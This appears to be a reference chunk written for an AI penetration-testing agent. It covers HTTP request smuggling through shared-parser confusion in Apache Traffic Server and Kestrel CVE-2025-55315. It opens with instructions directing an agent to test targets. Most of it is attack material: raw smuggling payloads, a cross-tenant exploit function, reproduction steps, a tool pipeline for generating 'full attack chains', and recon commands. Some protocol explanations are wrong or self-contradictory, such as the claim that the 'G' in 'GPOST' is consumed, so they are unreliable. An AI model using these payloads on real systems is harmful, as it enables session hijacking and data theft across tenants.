# Shared-Parser Confusion & Kestrel Scope-Changing Smuggling — Agent Chunk 73c
> Source: Deep Internet Research 2026 (Adversarially Verified)
> Purpose: Understand two new request smuggling classes — shared-parser confusion (intra-server, not differential) and ASP.NET Core Kestrel scope-changing smuggling that crosses tenant boundaries
> Context Window: Small (optimized for ~8K-12K tokens)

## Agent Instructions
When testing for request smuggling, expand beyond classic CL.TE/TE.CL differential attacks between front-end and back-end servers. Test for shared-parser confusion where a single server reuses its response-parsing logic on incoming requests, creating intra-server desync. Test ASP.NET Core Kestrel for scope-changing smuggling (CVSS Scope:Changed) that can cross tenant boundaries. Use the HTTP Terminator tool for AI-assisted discovery of new smuggling variants. These new classes evade traditional smuggling detection that looks only at differential behavior between two servers.

---

## 1. Shared-Parser Confusion (Black Hat USA 2026)

### 1.1 Overview

| Field | Value |
|-------|-------|
| Researcher | James Kettle (PortSwigger) |
| Presented | Black Hat USA 2026 |
| CVE | CVE-2026-63078 (Apache Traffic Server) |
| Affected Targets | ~700 servers identified |
| Class | NEW — Intra-server parsing confusion |

This is a fundamentally new class of request smuggling. Unlike classic CL.TE/TE.CL attacks that exploit differential parsing between a front-end proxy and back-end server, shared-parser confusion exploits response-parsing logic that is reused for incoming requests within a SINGLE server.

### 1.2 Root Cause: Response Parser Reuse

Many HTTP server implementations share parsing code between request parsing (incoming) and response parsing (from upstream). Response parsers have different requirements — they must handle response-specific constructs like status lines, chunked transfer encoding variants, and trailer handling differently from requests.

When this response-parsing logic is inadvertently applied to incoming requests, the server accepts malformed HTTP constructs that a strict request parser would reject. This creates a desync within a single server, not between two servers.

**Key distinction from classic smuggling:**
```
Classic CL.TE/TE.CL:
  Client -> [Front-end proxy] -> [Back-end server]
            ^--- parses CL         ^--- parses TE
  Differential between TWO servers

Shared-Parser Confusion:
  Client -> [Single Server with shared parser]
            ^--- response parser logic applied to requests
  Confusion within ONE server
```

### 1.3 CVE-2026-63078: Apache Traffic Server

Apache Traffic Server reuses portions of its HTTP response parser for processing incoming requests. The response parser permits certain constructs that the request specification forbids, including:

- Non-standard chunked encoding extensions
- Ambiguous Content-Length handling inherited from response parsing rules
- Trailer header processing differences

**Attack vector:**
```http
POST /target HTTP/1.1
Host: vulnerable-ats.example.com
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: identity

5c
POST /admin HTTP/1.1
Host: vulnerable-ats.example.com
Cookie: session=victim_session_token
Content-Length: 0

0

```

The shared parser processes the Transfer-Encoding headers using response-parsing rules that handle the `identity` value differently, causing the server to disagree with itself about where the first request ends and the second begins.

### 1.4 HTTP Terminator Tool

PortSwigger released HTTP Terminator (AGPL-3.0), an AI-assisted 4-stage pipeline for discovering new smuggling variants:

**Stage 1 — Seeker:**
- Extracts HTTP parsing techniques and edge cases from RFCs using Claude
- Identifies ambiguities in RFC 7230, 7231, 9110, 9112
- Produces a catalog of parsing decision points where implementations may diverge
- Input: RFC text. Output: structured list of parsing ambiguities

**Stage 2 — Flamer:**
- Generates malformed HTTP test cases targeting each ambiguity (Java/Gradle project)
- Creates combinatorial variations of headers, encodings, and formatting
- Produces thousands of test cases covering each parsing decision point
- Output: HTTP request templates with specific malformations

**Stage 3 — Validator:**
- Burp Suite extension for automated detection
- Sends test cases through target infrastructure
- Uses response timing, content differences, and connection behavior to detect desync
- Flags potential smuggling candidates for human review

**Stage 4 — Investigator:**
- Uses Claude Code for confirmation and exploitation
- Takes flagged candidates and builds proof-of-concept exploits
- Validates that the desync is exploitable for request smuggling
- Generates full attack chains

**Running the pipeline:**
```bash
# Clone and build
git clone https://github.com/PortSwigger/http-terminator.git
cd http-terminator

# Stage 1: Extract parsing techniques
cd seeker && python3 extract_techniques.py --rfc 9110 9112

# Stage 2: Generate test cases
cd ../flamer && gradle run --args="--techniques ../seeker/output/techniques.json"

# Stage 3: Validate via Burp
# Load flamer/output/ into Burp Suite extension

# Stage 4: Confirm via Claude Code
cd ../investigator && python3 confirm.py --candidates ../validator/flagged.json
```

### 1.5 Exploitation Chain

```
Shared-parser smuggling
    -> Cache poisoning (smuggled response stored for victim URL)
    -> Credential theft (victim's cookies attached to smuggled request)
    -> Authentication bypass (smuggled request inherits victim's session)
    -> Persistent XSS via cached poisoned response
```

### 1.6 Detection

```python
# Shared-parser confusion detection
def test_shared_parser_confusion(target):
    """Test for intra-server parsing confusion."""
    
    test_cases = [
        # Response-style chunked extension in request
        {
            "name": "chunked_extension_in_request",
            "headers": {
                "Transfer-Encoding": "chunked;ext=value",
                "Content-Length": "0"
            },
            "body": "0\r\n\r\n"
        },
        # identity TE (valid in responses, ambiguous in requests)
        {
            "name": "identity_te_confusion",
            "headers": {
                "Transfer-Encoding": "chunked, identity",
                "Content-Length": "5"
            },
            "body": "3\r\nABC\r\n0\r\n\r\n"
        },
        # Trailer headers in request (response parser feature)
        {
            "name": "trailer_header_injection",
            "headers": {
                "Transfer-Encoding": "chunked",
                "Trailer": "X-Injected"
            },
            "body": "0\r\nX-Injected: smuggled_value\r\n\r\n"
        },
    ]
    
    for test in test_cases:
        baseline = send_normal_request(target)
        confused = send_malformed_request(target, test)
        
        if response_differs(baseline, confused):
            print(f"POTENTIAL SHARED-PARSER CONFUSION: {test['name']}")
            print(f"  Baseline: {baseline.status_code}, len={len(baseline.content)}")
            print(f"  Confused: {confused.status_code}, len={len(confused.content)}")
```

---

## 2. ASP.NET Core Kestrel Scope-Changing Smuggling

### 2.1 Vulnerability Overview (CVE-2025-55315)

| Field | Value |
|-------|-------|
| CVE | CVE-2025-55315 |
| CVSS | Scope: Changed (S:C) |
| Affected | .NET 8.0.x < 8.0.21, .NET 9.0.x < 9.0.10 |
| Class | CWE-444 (HTTP Request/Response Smuggling) |

Scope-changing means the vulnerability in Kestrel can affect components beyond Kestrel's own security scope — specifically, it can cross tenant boundaries in multi-tenant deployments.

### 2.2 CL.TE Variant

When Kestrel sits behind a front-end proxy that prioritizes Content-Length, but Kestrel prioritizes Transfer-Encoding:

```http
POST / HTTP/1.1
Host: multitenant-app.example.com
Content-Length: 6
Transfer-Encoding: chunked

0

GPOST /tenant-b/admin HTTP/1.1
Host: multitenant-app.example.com
Cookie: session=tenant_a_cookie
Content-Length: 0


```

**What happens:**
1. Front-end proxy sees `Content-Length: 6` — sends `"0\r\n\r\nG"` as body
2. Kestrel sees `Transfer-Encoding: chunked` — reads `"0\r\n\r\n"` as empty chunked body
3. The `G` begins a new smuggled request: `GPOST` (becomes `POST` after `G` is consumed by Kestrel's parser as part of the chunked trailer)
4. Smuggled request to `/tenant-b/admin` inherits tenant A's authentication context

### 2.3 TE.CL Variant

When Kestrel sits behind a front-end proxy that prioritizes Transfer-Encoding, but Kestrel prioritizes Content-Length:

```http
POST / HTTP/1.1
Host: multitenant-app.example.com
Content-Length: 100
Transfer-Encoding: chunked

0

POST /cross-tenant-api HTTP/1.1
Host: multitenant-app.example.com
X-Tenant-ID: victim-tenant
Content-Length: 0


```

### 2.4 Scope-Changing Impact

The scope-changing designation (CVSS S:C) means the smuggled request can cross security boundaries that the front-end proxy enforces:

```
Tenant A authentication context
    -> Smuggled request crosses tenant boundary
    -> Accesses Tenant B endpoints
    -> Inherits Tenant A cookies on Tenant B requests
    -> Session hijacking across tenants
    -> Cache poisoning serves Tenant A content to Tenant B users
```

**Multi-tenant exploitation scenario:**
```python
def exploit_kestrel_scope_change(target, victim_tenant):
    """Cross tenant boundaries via Kestrel CL.TE smuggling."""
    
    smuggled_request = (
        f"GET /{victim_tenant}/api/users HTTP/1.1\r\n"
        f"Host: {target}\r\n"
        f"X-Tenant-ID: {victim_tenant}\r\n"
        f"\r\n"
    )
    
    # CL.TE: proxy uses CL, Kestrel uses TE
    payload = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {target}\r\n"
        f"Content-Length: {len(smuggled_request) + 5}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"0\r\n"
        f"\r\n"
        f"{smuggled_request}"
    )
    
    # Send payload — smuggled request executes in victim tenant context
    sock = create_connection(target, 443)
    sock.send(payload.encode())
    
    # Next legitimate request from any user will receive 
    # the response to our smuggled cross-tenant request
    response = sock.recv(4096)
    return response
```

### 2.5 Reproduction Steps

1. Identify target running ASP.NET Core with Kestrel (.NET 8.0.x < 8.0.21 or 9.0.x < 9.0.10) behind a reverse proxy
2. Determine proxy's header priority (CL vs TE) using timing-based detection
3. Craft CL.TE or TE.CL payload with smuggled request targeting another tenant
4. Send through the front-end proxy
5. Kestrel disagrees on request boundary, processes smuggled request
6. Smuggled request inherits the authentication context of the next legitimate request
7. Response to the smuggled cross-tenant request is served to the victim user

### 2.6 Detection

```python
def detect_kestrel_smuggling(target):
    """Detect Kestrel CL.TE and TE.CL smuggling."""
    
    # Timing-based detection: CL.TE
    cl_te_probe = (
        "POST / HTTP/1.1\r\n"
        f"Host: {target}\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "1\r\n"
        "Z\r\n"
        "Q"  # If CL.TE: proxy sends this, Kestrel waits for chunk end -> timeout
    )
    
    # Timing-based detection: TE.CL
    te_cl_probe = (
        "POST / HTTP/1.1\r\n"
        f"Host: {target}\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "X"  # If TE.CL: Kestrel stops at 0, "X" starts smuggled req -> timeout
    )
    
    for name, probe in [("CL.TE", cl_te_probe), ("TE.CL", te_cl_probe)]:
        start = time.time()
        try:
            send_raw(target, probe, timeout=10)
        except socket.timeout:
            elapsed = time.time() - start
            if elapsed >= 9:
                print(f"POTENTIAL {name} SMUGGLING: timeout indicates desync")

    # .NET version fingerprinting
    resp = requests.get(f"https://{target}/", allow_redirects=False)
    server = resp.headers.get("Server", "")
    if "Kestrel" in server:
        print("KESTREL DETECTED — test for CVE-2025-55315")
```

---

## 3. Tools and Resources

### 3.1 HTTP Terminator Setup

```bash
# Requirements: Java 17+, Gradle, Python 3.10+, Burp Suite Pro
git clone https://github.com/PortSwigger/http-terminator.git
cd http-terminator

# Build Flamer (test case generator)
cd flamer && gradle build

# Install Seeker dependencies
cd ../seeker && pip install -r requirements.txt

# Load Validator extension in Burp Suite
# Extensions -> Add -> http-terminator/validator/build/libs/validator.jar
```

### 3.2 Kestrel Version Detection

```bash
# Check .NET runtime version via response headers
curl -sI https://target.com/ | grep -i "x-powered-by\|server\|x-aspnet-version"

# Check via error page disclosure
curl -s https://target.com/nonexistent-path-trigger-error | grep -i "\.net\|kestrel\|aspnetcore"
```
